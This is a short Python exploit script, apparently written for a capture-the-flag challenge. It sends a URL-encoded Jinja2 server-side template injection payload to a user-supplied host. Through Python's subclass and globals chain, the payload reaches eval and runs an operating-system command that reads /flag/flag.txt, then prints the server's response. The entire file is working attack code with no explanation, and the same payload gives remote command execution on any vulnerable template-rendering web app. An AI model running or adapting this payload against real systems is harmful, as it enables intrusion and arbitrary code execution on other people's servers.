# ! /usr/bin/python3
# SSTI
# Author Beethen

from ipaddress import ip_address
import sys
import requests
import time
import os
import urllib.request
from urllib3.exceptions import InsecureRequestWarning

ip = input("Enter the IP such as '1.1.1.1:80': ")
print('Running...\n')
str(ip)
URL ='http://' + ip + """/index/?content={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}%20{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}%20{%%20for%20b%20in%20c.__init__.__globals__.values()%20%}%20{%%20if%20b.__class__%20==%20{}.__class__%20%}%20{%%20if%20%27eval%27%20in%20b.keys()%20%}%20{{%20b[%27eval%27](%27__import__(%22os%22).popen(%22cat%20/flag/flag.txt%22).read()%27)%20}}{%%20endif%20%}%20{%%20endif%20%}%20{%%20endfor%20%}%20{%%20endif%20%}%20{%%20endfor%20%}"""
response =  urllib.request.urlopen(URL)
html = response.read()
html = html.decode('utf-8')
html = html.strip()
print('The flag is: \n\n')
print('    ' + html + '\n')